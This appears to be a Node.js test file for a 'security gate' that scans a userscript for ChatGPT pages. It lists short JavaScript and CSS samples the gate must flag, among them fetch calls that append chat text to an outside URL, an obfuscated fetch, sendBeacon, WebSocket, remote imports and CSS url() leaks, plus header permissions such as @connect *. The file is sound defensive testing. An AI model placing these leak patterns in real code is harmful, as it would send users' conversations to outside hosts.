'use strict';
const assert = require('node:assert/strict');
const {inspectJavaScript, inspectHeader, inspectCssResources} = require('../tools/security-gate.cjs');
const bad = [
  'fetch("https://example.com/?msg=" + text)',
  'const leak = window["fet" + "ch"]',
  'navigator.sendBeacon("/leak", chat)',
  'new WebSocket("wss://example.com")',
  'new XMLHttpRequest()',
  'document.createElement("script")',
  'document.createElement(dynamicTag)',
  'element.setAttribute("src", chatUrl)',
  'image.src = userGeneratedUrl',
  'window.open(url)',
  'import("https://example.com/plugin.js")'
];
for (const source of bad) {
  const detected = inspectJavaScript(source, 'test-malicious.js');
  assert(detected.length > 0, `Security Gate missed ${source}`);
}
for (const source of [
  'const size = Math.round(tokens / 4);',
  'const div = document.createElement("div")',
  'const img = document.createElement("img")',
  'const text = "fetch(\\"https://example.com\\")"; // not an API call',
  'const url = URL.createObjectURL(new Blob(["local"]));'
]) assert.deepEqual(inspectJavaScript(source, 'safe.js'), [], `False alarm for ${source}`);
const cacheAllowed = `function readCachedFavicon(doc) {
  const url=cachedFaviconUrl(doc);
  if (!url || navigator.serviceWorker?.controller) return null;
  return window.fetch(url, {mode:'same-origin', cache:'only-if-cached', credentials:'same-origin', redirect:'error'});
}`;
assert.deepEqual(inspectJavaScript(cacheAllowed, 'src/ui/12-panel-site-icon.js'), []);
for (const suspicious of [
  cacheAllowed.replace('only-if-cached','force-cache'),
  cacheAllowed.replace('navigator.serviceWorker?.controller', 'false'),
  cacheAllowed.replace('window.fetch', 'fetch')
]) assert(inspectJavaScript(suspicious, 'src/ui/12-panel-site-icon.js').length);
const header = ['// @match        https://chatgpt.com/*',
  '// @match        https://chat.openai.com/*', '// @grant        none',
  '// @run-at       document-idle', '// @noframes'].join('\n');
assert.deepEqual(inspectHeader(header, 'safe'), []);
assert(inspectHeader(header + '\n// @connect      *', 'unsafe').length);
assert(inspectHeader(header.replace('@grant        none', '@grant        GM_xmlhttpRequest'), 'unsafe').length);
assert(inspectCssResources('.x{background:url(https://example.com/leak?q=1)}', 'unsafe.css').length);
assert(inspectCssResources('@import "https://example.com/x.css";', 'unsafe.css').length);
assert.deepEqual(inspectCssResources('.x{background:url(data:image/png;base64,AAAA)}', 'safe.css'), []);
console.log('PASS Security Gate rejects network/DOM leaks and unreviewed permissions');
